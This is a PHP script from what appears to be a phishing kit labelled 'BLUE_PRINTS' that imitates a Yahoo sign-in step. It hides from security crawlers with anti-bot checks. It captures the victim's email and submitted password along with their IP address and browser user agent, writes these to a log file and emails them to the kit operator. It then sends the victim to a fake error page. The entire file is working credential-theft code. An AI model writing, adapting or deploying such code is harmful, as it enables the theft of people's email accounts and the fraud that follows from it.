<?php
error_reporting(0);
session_start();
require_once '../../src/Classes/Comp.php';
    require_once '../../src/Classes/Antibot.php';

    $comps = new Comp;
    $antibot = new Antibot;

    if (!$comps->checkValue()) {
        echo $antibot->throw404();
        die();
    } 
    include '../../crawlerdetect.php';

$v_ip = $_SERVER['REMOTE_ADDR'];
$hash = $_SESSION['value'];

if(!empty($_SESSION['email']))  {

$useremail = $_SESSION['email'];
 
}

if(!empty($_POST['password']))  {

$pass = $_POST['password'];
$_SESSION['password'] = $_POST['password'];
date_default_timezone_set('Europe/Amsterdam');
$ip = $_SERVER['REMOTE_ADDR'];

$useremail = $_SESSION['email'];

$time = date("m-d-Y g:i:a");
$agent = $_SERVER['HTTP_USER_AGENT'];

include "../../step/conf/config.php";


$msg .= "+ ------------------------------------------+\n";
$msg .= "|   💵BLUE_PRINTS | yahoo Login Details \n";
$msg .= "+ ------------------------------------------+\n";
$msg .= "| 📧 EMAIL  :  ".$useremail."\n";
$msg .= "| 🔑 PASS   :  ".$pass."\n"; 
$footer = "+ ------------------------------------------+\n";
$footer .= "+ IP => $ip \n  USERAGENT => $agent\n";
$footer .= "+ ------------------------------------------+\n\n";

$data = $msg . $footer;
if($savetxt == "on"){
$save=fopen("../../step/data/email".$salt.".txt",'a');
	          fwrite($save,$data );
	          fclose($save);
			
}
$subject="Email 1NFO By BLUE_PR1NTS=> {$_SESSION['ip']} [ {$_SESSION['platform']} ]";
$headers="From: BLUE_PR1NTS <VR1D14N@BLUE_PRINTS1.com>\r\n";
$headers .= "Content-Type: text/plain; charset=utf-8\r\n";
@mail($emailzz, $subject, $data, $headers);
header("location: error.php?value={$_SESSION['value']}"); 
}

?>